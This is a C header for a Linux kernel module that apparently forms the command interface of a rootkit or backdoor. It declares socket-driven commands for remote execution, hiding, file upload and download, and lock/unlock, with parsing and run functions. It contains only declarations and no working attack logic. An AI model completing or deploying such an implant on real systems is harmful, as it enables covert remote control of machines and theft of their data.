#ifndef COMMANDS_H
#define COMMANDS_H

#include <linux/inet.h>

#define MAX_ARGS_LEN 1024

// Stop file upload after this many 1024 bytes chunks have been recieved
#define MAX_UPLOAD_ITERATIONS 1024 * 1024

enum command_type
{
    CMD_EXEC_SYNC,
    CMD_EXEC_ASYNC,
    CMD_HIDE,
    CMD_UPLOAD,
    CMD_DOWNLOAD,
    CMD_UNLOCK,
    CMD_LOCK,
    CMD_UNKNOWN
};

// must return non-0 on failure, -1 on socket failure
typedef int (*cmd_callback)(struct socket *sock, char *args);

struct command
{
    enum command_type type;
    char args[MAX_ARGS_LEN];
    cmd_callback callback;
};

int cmd_build(struct command *cmd, const char *payload);
int cmd_run(struct command *cmd, char *buf);

enum cmd_build_err
{
    ERR_EMPTY = 1, // provided cmd or payload is null
    ERR_BAD_OPCODE, // unkown opcode
    ERR_NO_ARGS, // command expects args, but none provided
    ERR_LONG_ARGS, // arguments length > MAX_ARGS_LEN
    ERR_BAD_ARGS, // arguments are invalid (used for too short early-return)
};

#endif // !COMMANDS_H
